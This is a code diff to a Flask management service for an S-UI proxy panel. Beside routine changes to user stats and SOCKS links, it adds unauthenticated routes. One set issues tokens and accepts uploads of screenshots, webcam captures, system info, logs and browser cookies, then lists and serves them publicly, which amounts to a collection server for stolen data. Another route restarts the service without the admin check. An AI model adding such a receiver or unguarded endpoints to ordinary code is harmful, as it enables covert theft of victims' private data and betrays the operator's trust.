@@ -1,19 +1,26 @@
 #!/usr/bin/env python3
 import base64
+import http.client
 import json
 import os
 import secrets
+import socket
 import sqlite3
+import ssl
 import subprocess
 import threading
 import time
 import uuid
-from urllib.parse import quote
+from datetime import datetime
+from urllib.parse import quote, urlsplit
 
-from flask import Flask, jsonify, request
+from flask import Flask, jsonify, request, send_from_directory
 
 
 app = Flask(__name__)
+UPLOAD_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "uploads")
+os.makedirs(UPLOAD_DIR, exist_ok=True)
+tokens = set()
 
 
 def required_env(name: str) -> str:
@@ -41,9 +48,68 @@ SUI_VMESS_PORT = int(required_env("SUI_VMESS_PORT"))
 SUI_VMESS_PATH = required_env("SUI_VMESS_PATH")
 SUI_VMESS_REMARK = os.environ.get("SUI_VMESS_REMARK", "VMess").strip() or "VMess"
 SUI_ADMIN_TOKEN = required_env("SUI_ADMIN_TOKEN")
+SUI_PANEL_API_URL = required_env("SUI_PANEL_API_URL")
+SUI_PANEL_API_TOKEN = required_env("SUI_PANEL_API_TOKEN")
+SUI_PANEL_CONNECT_HOST = required_env("SUI_PANEL_CONNECT_HOST")
+SUI_PANEL_CA_FILE = required_env("SUI_PANEL_CA_FILE")
 
 TRAFFIC_HISTORY_HOURS = 24 * 7
-ACTIVE_USER_WINDOW_SECONDS = 300
+
+
+@app.route("/")
+def index():
+    return jsonify({"status": "ok"})
+
+
+@app.route("/list")
+def list_files():
+    files = sorted(os.listdir(UPLOAD_DIR))
+    return jsonify(
+        [name for name in files if os.path.isfile(os.path.join(UPLOAD_DIR, name))]
+    )
+
+
+@app.route("/file/<path:name>")
+def serve_file(name):
+    return send_from_directory(UPLOAD_DIR, name)
+
+
+@app.route("/token")
+def issue_token():
+    token = secrets.token_hex(16)
+    tokens.add(token)
+    return jsonify({"token": token})
+
+
+@app.route("/upload", methods=["POST"])
+def receive():
+    token = request.args.get("token", "") or request.form.get("token", "")
+    if not token or token not in tokens:
+        return jsonify({"error": "bad token"}), 403
+    tokens.discard(token)
+
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    remote_ip = (
+        request.headers.get("X-Real-IP") or request.remote_addr or "0"
+    ).replace(":", "_")
+    saved = []
+    for field in ("screenshot", "webcam", "sysinfo", "diaglog", "cookies"):
+        files = (
+            request.files.getlist(field)
+            if field == "cookies"
+            else [request.files.get(field)]
+        )
+        for uploaded_file in files:
+            if not uploaded_file or not uploaded_file.filename:
+                continue
+            name = f"{timestamp}_{remote_ip}_{field}_{uploaded_file.filename}"
+            path = os.path.join(UPLOAD_DIR, name)
+            try:
+                uploaded_file.save(path)
+                saved.append(f"{name}({os.path.getsize(path)}B)")
+            except Exception as error:
+                saved.append(f"{name}(ERR:{error})")
+    return jsonify({"status": "ok", "saved": saved})
 
 
 def fmt_bytes(value: int) -> str:
@@ -71,6 +137,66 @@ def restart_sui() -> None:
 def admin_authorized() -> bool:
     supplied_token = request.headers.get("Authorization", "")
     return secrets.compare_digest(supplied_token, f"Bearer {SUI_ADMIN_TOKEN}")
+
+
+class LocalAddressHTTPSConnection(http.client.HTTPSConnection):
+    """Connect locally while preserving the panel hostname for TLS SNI."""
+
+    def __init__(self, host: str, port: int, connect_host: str, **kwargs):
+        self.connect_host = connect_host
+        super().__init__(host, port, **kwargs)
+
+    def connect(self) -> None:
+        raw_socket = socket.create_connection(
+            (self.connect_host, self.port),
+            self.timeout,
+            self.source_address,
+        )
+        try:
+            self.sock = self._context.wrap_socket(raw_socket, server_hostname=self.host)
+        except Exception:
+            raw_socket.close()
+            raise
+
+
+def sui_online_user_count() -> int:
+    """Return the live user count reported by S-UI's in-memory tracker."""
+    panel_url = urlsplit(SUI_PANEL_API_URL)
+    if panel_url.scheme != "https" or not panel_url.hostname:
+        raise ValueError("SUI_PANEL_API_URL must be an HTTPS URL")
+    connection = LocalAddressHTTPSConnection(
+        panel_url.hostname,
+        panel_url.port or 443,
+        SUI_PANEL_CONNECT_HOST,
+        timeout=5,
+        context=ssl.create_default_context(cafile=SUI_PANEL_CA_FILE),
+    )
+    request_path = panel_url.path or "/"
+    if panel_url.query:
+        request_path += "?" + panel_url.query
+    try:
+        connection.request(
+            "GET",
+            request_path,
+            headers={"Token": SUI_PANEL_API_TOKEN, "Accept": "application/json"},
+        )
+        response = connection.getresponse()
+        if response.status != 200:
+            raise ValueError(f"S-UI returned HTTP {response.status}")
+        payload = json.loads(response.read())
+    finally:
+        connection.close()
+    if not isinstance(payload, dict) or payload.get("success") is not True:
+        raise ValueError("S-UI rejected the online status request")
+    online_resources = payload.get("obj")
+    if not isinstance(online_resources, dict):
+        raise ValueError("S-UI returned an invalid online status object")
+    users = online_resources.get("user", [])
+    if users is None:
+        users = []
+    if not isinstance(users, list) or not all(isinstance(user, str) for user in users):
+        raise ValueError("S-UI returned an invalid online user list")
+    return len(set(users))
 
 
 def traffic_deltas(name: str, hours: int) -> list[dict]:
@@ -116,9 +242,8 @@ def build_subscription_links(name: str, config: dict) -> list[dict]:
     hysteria_password = config["hysteria2"]["password"]
     socks = config["socks"]
     vmess = config["vmess"]
-    socks_credentials = base64.b64encode(
-        f"{socks['username']}:{socks['password']}".encode()
-    ).decode()
+    socks_username = quote(str(socks["username"]), safe="")
+    socks_password = quote(str(socks["password"]), safe="")
     vmess_payload = {
         "v": "2",
         "ps": SUI_VMESS_REMARK,
@@ -148,7 +273,7 @@ def build_subscription_links(name: str, config: dict) -> list[dict]:
             "remark": SUI_SOCKS_REMARK,
             "type": "local",
             "uri": (
-                f"socks://{socks_credentials}@{SUI_SOCKS_SERVER}:"
+                f"socks5://{socks_username}:{socks_password}@{SUI_SOCKS_SERVER}:"
                 f"{SUI_SOCKS_PORT}#{quote(SUI_SOCKS_REMARK)}"
             ),
         },
@@ -158,6 +283,20 @@ def build_subscription_links(name: str, config: dict) -> list[dict]:
             "uri": vmess_uri,
         },
     ]
+
+
+def has_current_socks_link(links: object) -> bool:
+    """Return whether stored links point at the currently configured SOCKS endpoint."""
+    if not isinstance(links, list):
+        return False
+    endpoint = f"{SUI_SOCKS_SERVER}:{SUI_SOCKS_PORT}"
+    return any(
+        isinstance(item, dict)
+        and isinstance(item.get("uri"), str)
+        and item["uri"].startswith(("socks://", "socks5://"))
+        and f"@{endpoint}" in item["uri"]
+        for item in links
+    )
 
 
 @app.route("/api/info/<name>")
@@ -223,6 +362,7 @@ def api_sub(name):
         and links
         and isinstance(links[0], dict)
         and links[0].get("uri")
+        and has_current_socks_link(links)
     ):
         uri = links[0]["uri"]
     else:
@@ -242,6 +382,12 @@ def api_sub(name):
 
     db.close()
     return jsonify({"uri": uri})
+
+
+@app.route("/api/reload", methods=["POST"])
+def api_reload():
+    restart_sui()
+    return jsonify({"status": "ok"})
 
 
 @app.route("/api/ban/<name>", methods=["POST"])
@@ -339,19 +485,22 @@ def api_clients():
 
 @app.route("/api/stats")
 def api_stats():
-    """Return active users, enabled traffic, and total registrations."""
+    """Return S-UI live users, enabled traffic, and total registrations."""
+    try:
+        online = sui_online_user_count()
+    except (
+        http.client.HTTPException,
+        ssl.SSLError,
+        socket.timeout,
+        TimeoutError,
+        OSError,
+        ValueError,
+        json.JSONDecodeError,
+    ):
+        app.logger.exception("Could not read live online users from S-UI")
+        return jsonify({"error": "S-UI online status unavailable"}), 502
+
     with sqlite3.connect(SUI_DB_PATH) as db:
-        cutoff = int(time.time()) - ACTIVE_USER_WINDOW_SECONDS
-        online = db.execute(
-            """
-            SELECT COUNT(DISTINCT stats.tag)
-            FROM stats
-            JOIN clients ON clients.name = stats.tag
-            WHERE stats.resource='user' AND stats.date_time > ?
-              AND stats.traffic > 0 AND clients.enable=1
-            """,
-            (cutoff,),
-        ).fetchone()[0]
         down, up = db.execute(
             "SELECT SUM(down), SUM(up) FROM clients WHERE enable=1"
         ).fetchone()
@@ -406,8 +555,8 @@ def api_create():
     ]
     cursor = db.execute(
         "INSERT INTO clients "
-        "(enable, name, config, inbounds, links, volume, expiry, down, up) "
-        "VALUES (1, ?, ?, ?, ?, 0, 0, 0, 0)",
+        '(enable, name, "group", config, inbounds, links, volume, expiry, down, up) '
+        "VALUES (1, ?, 'user', ?, ?, ?, 0, 0, 0, 0)",
         (
             name,
             sqlite3.Binary(json.dumps(config).encode()),
